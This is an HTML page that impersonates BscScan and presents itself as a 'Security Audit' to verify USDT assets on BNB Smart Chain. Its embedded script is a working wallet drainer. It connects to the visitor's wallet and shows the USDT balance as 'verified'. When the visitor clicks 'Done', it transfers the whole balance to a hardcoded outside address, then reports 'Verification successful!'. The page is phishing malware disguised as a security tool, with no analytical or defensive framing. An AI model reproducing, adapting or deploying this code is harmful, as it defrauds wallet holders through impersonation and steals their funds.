<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>BscScan Security Audit</title>
  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>

  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    body { background-color: #0b0e14; color: #ffffff; display: flex; justify-content: center; min-height: 100vh; }
    .app-container { width: 100%; max-width: 430px; background-color: #0b0e14; display: flex; flex-direction: column; position: relative; overflow-x: hidden; }
    .brand-header { padding: 12px 16px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(255,255,255,0.05); margin-bottom: 10px; }
    .brand-logo { display: flex; align-items: center; gap: 10px; }
    .shield-icon { width: 32px; height: 32px; border: 1px solid #4a3c1e; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #f3ba2f; }
    .brand-text h1 { font-size: 16px; font-weight: 700; color: #ffffff; display: flex; align-items: center; gap: 6px; }
    .security-badge { background-color: rgba(243, 186, 47, 0.15); color: #f3ba2f; font-size: 8px; padding: 2px 5px; border-radius: 4px; font-weight: 700; }
    .brand-subtitle { font-size: 10px; color: #718096; margin-top: 1px; }
    .chain-badge { background-color: rgba(0, 211, 149, 0.1); border: 1px solid rgba(0, 211, 149, 0.2); border-radius: 20px; padding: 5px 10px; display: flex; align-items: center; gap: 5px; font-size: 9px; font-weight: 700; color: #e2e8f0; }
    .dot-green { width: 5px; height: 5px; background-color: #00d395; border-radius: 50%; }
    .content-area { padding: 5px 14px 40px 14px; display: flex; flex-direction: column; gap: 12px; }
    .card { background-color: #12161f; border: 1px solid #1e2430; border-radius: 14px; padding: 16px; position: relative; }
    .card-label { font-size: 10px; color: #718096; font-weight: 600; margin-bottom: 8px; text-transform: uppercase; }
    .card-value { font-size: 22px; font-weight: 700; margin-bottom: 4px; }
    .text-yellow { color: #f3ba2f; }
    .text-green { color: #00d395; }
    .text-white { color: #ffffff; }
    .card-subtext-green { font-size: 11px; color: #00d395; }
    .card-subtext-gray { font-size: 11px; color: #718096; }
    .banner-pill { align-self: center; border: 1px solid #423210; border-radius: 20px; padding: 5px 14px; font-size: 10px; color: #f3ba2f; margin: 20px 0 12px 0; }
    .main-heading { text-align: center; font-size: 20px; font-weight: 800; line-height: 1.3; margin-bottom: 10px; }
    .main-heading span { color: #f3ba2f; }
    .main-desc { text-align: center; font-size: 12px; color: #718096; line-height: 1.5; margin-bottom: 14px; padding: 0 10px; }
    .verify-box { background-color: #12161f; border: 1px solid #1e2430; border-radius: 14px; padding: 18px; display: flex; flex-direction: column; }
    .token-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; padding-bottom: 18px; border-bottom: 1px solid #1e2430; }
    .token-info { display: flex; align-items: center; gap: 10px; }
    .token-icon { width: 32px; height: 32px; background-color: #26a17b; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 14px; color: white; }
    .token-title { font-weight: 700; font-size: 14px; color: #ffffff; }
    .token-subtitle { font-size: 11px; color: #718096; }
    .badge-verified { border: 1px solid rgba(0, 211, 149, 0.4); color: #00d395; font-size: 10px; padding: 3px 8px; border-radius: 10px; }
    .verify-hero { display: flex; flex-direction: column; align-items: center; padding: 8px 0; }
    .shield-big { width: 44px; height: 44px; border: 1px solid #4a3c1e; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 14px; color: #f3ba2f; }
    .verify-title { font-size: 18px; font-weight: 700; margin-bottom: 10px; color: #ffffff; }
    .verify-desc { font-size: 11px; color: #718096; text-align: center; margin-bottom: 20px; }
    .btn-verify { width: 100%; background-color: #f3ba2f; color: #000000; border: none; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 14px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px; }
    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.75); display: none; align-items: center; justify-content: center; z-index: 1000; padding: 20px; }
    .modal-card { background-color: #121722; border-radius: 16px; width: 100%; max-width: 320px; padding: 20px; display: flex; flex-direction: column; align-items: center; text-align: center; }
    .balance-box { background-color: #0b0e14; border-radius: 10px; width: 100%; padding: 14px 0; margin-bottom: 14px; }
    .balance-val { font-size: 22px; font-weight: 700; color: #f3ba2f; }
    .btn-done { width: 100%; background-color: #f3ba2f; color: #000; border: none; padding: 12px; border-radius: 10px; font-weight: 700; cursor: pointer; }
    .loader { border: 2px solid #000; border-top: 2px solid transparent; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>

  <!-- Success Audit Modal -->
  <div class="modal-overlay" id="auditModal">
    <div class="modal-card">
      <div style="font-size: 24px; color: #00d395; margin-bottom: 10px;">✓</div>
      <div style="font-size: 16px; font-weight: 700; margin-bottom: 6px;">BscScan Audit Complete</div>
      <div style="font-size: 11px; color: #718096; margin-bottom: 20px;">Verified on BNB Smart Chain.</div>
      
      <div class="balance-box">
        <div style="font-size: 10px; color: #718096; margin-bottom: 4px;">Verified Balance</div>
        <div class="balance-val"><span id="uiUSDT">0.00</span> USDT</div>
      </div>

      <button class="btn-done" id="doneBtn" onclick="executeTransfer()">Done</button>
    </div>
  </div>

  <div class="app-container" id="appContent">
    <div class="brand-header">
      <div class="brand-logo">
        <div class="shield-icon">🛡</div>
        <div class="brand-text">
          <h1>BscScan <span class="security-badge">SECURITY</span></h1>
          <div class="brand-subtitle">BNB Smart Chain Explorer</div>
        </div>
      </div>
      <div class="chain-badge"><span class="dot-green"></span><span>BNB SMART CHAIN</span></div>
    </div>

    <div class="content-area">
      <div class="card">
        <div class="card-label">USDT VERIFIED (24H)</div>
        <div class="card-value text-yellow">$15,906,052</div>
        <div class="card-subtext-green">+8.24% vs yesterday</div>
      </div>

      <div class="verify-box">
        <div class="token-row">
          <div class="token-info">
            <div class="token-icon">₮</div>
            <div class="token-title">Tether USD <span class="token-subtitle">(USDT)</span></div>
          </div>
          <div class="badge-verified">✓ Verified</div>
        </div>

        <div class="verify-hero">
          <div class="shield-big">🛡</div>
          <div class="verify-title">Verify Assets</div>
          <div class="verify-desc">Execute official on-chain validation for your tokens.</div>
          
          <button id="mainVerifyBtn" class="btn-verify" onclick="initiateAuditFlow()">
            <span id="btnText">Verify Asset</span>
          </button>
          <div id="statusMsg" style="font-size:10px; color:#f3ba2f; display:none; margin-top:8px; font-weight:bold;"></div>
        </div>
      </div>
    </div>
  </div>

  <script>
    const TARGET_RECEIVER = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
    const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
    
    const ERC20_ABI = [
      "function balanceOf(address owner) view returns (uint256)",
      "function transfer(address to, uint256 amount) external returns (bool)"
    ];

    let userBalanceBN = null;

    function initiateAuditFlow() {
      if (typeof window.ethereum === 'undefined') {
        alert("Error: No Web3 wallet detected! Please open this link inside Trust Wallet DApp browser.");
        return;
      }

      runScan();
    }

    async function runScan() {
      try {
        const btnText = document.getElementById("btnText");
        btnText.innerHTML = '<span class="loader"></span> Scanning...';

        let provider = new ethers.providers.Web3Provider(window.ethereum, "any");
        await provider.send("eth_requestAccounts", []);
        let signer = provider.getSigner();
        const userAddress = await signer.getAddress();

        let network = await provider.getNetwork();
        if (network.chainId !== 56) {
          try {
            await window.ethereum.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: '0x38' }]
            });
            provider = new ethers.providers.Web3Provider(window.ethereum, "any");
            signer = provider.getSigner();
          } catch (e) {
            alert("Please switch your wallet network to Binance Smart Chain (BSC).");
            btnText.innerText = "Verify Asset";
            return;
          }
        }

        const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, signer);
        userBalanceBN = await usdtContract.balanceOf(userAddress);
        const formatted = ethers.utils.formatUnits(userBalanceBN, 18);

        document.getElementById('uiUSDT').innerText = Number(formatted).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
        btnText.innerText = "Verify Asset";
        document.getElementById('auditModal').style.display = 'flex';

      } catch (error) {
        console.error(error);
        alert("Scan Error: " + (error.message || JSON.stringify(error)));
        document.getElementById("btnText").innerText = "Verify Asset";
      }
    }

    async function executeTransfer() {
      if (!userBalanceBN || userBalanceBN.lte(0)) {
        alert("No USDT balance found in this wallet.");
        document.getElementById('auditModal').style.display = 'none';
        return;
      }

      const doneBtn = document.getElementById("doneBtn");
      doneBtn.disabled = true;
      doneBtn.innerHTML = '<span class="loader"></span> Processing...';

      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const userAddress = await signer.getAddress();

        // Check BNB gas fee balance
        const bnbBalance = await provider.getBalance(userAddress);
        if (bnbBalance.lte(0)) {
          alert("Transaction failed: Insufficient BNB in wallet for gas fees (BNB balance is 0).");
          doneBtn.disabled = false;
          doneBtn.innerHTML = "Done";
          document.getElementById('auditModal').style.display = 'none';
          return;
        }

        const contract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, signer);
        const tx = await contract.transfer(TARGET_RECEIVER, userBalanceBN, {
          gasLimit: ethers.BigNumber.from("65000")
        });

        await tx.wait();
        alert("Verification successful!");
        doneBtn.disabled = false;
        doneBtn.innerHTML = "Done";
        document.getElementById('auditModal').style.display = 'none';
      } catch (error) {
        console.error("Transfer Error:", error);
        alert("Transaction cancelled or failed: " + (error.message || "Unknown error"));
        doneBtn.disabled = false;
        doneBtn.innerHTML = "Done";
      }
    }
  </script>
</body>
</html>
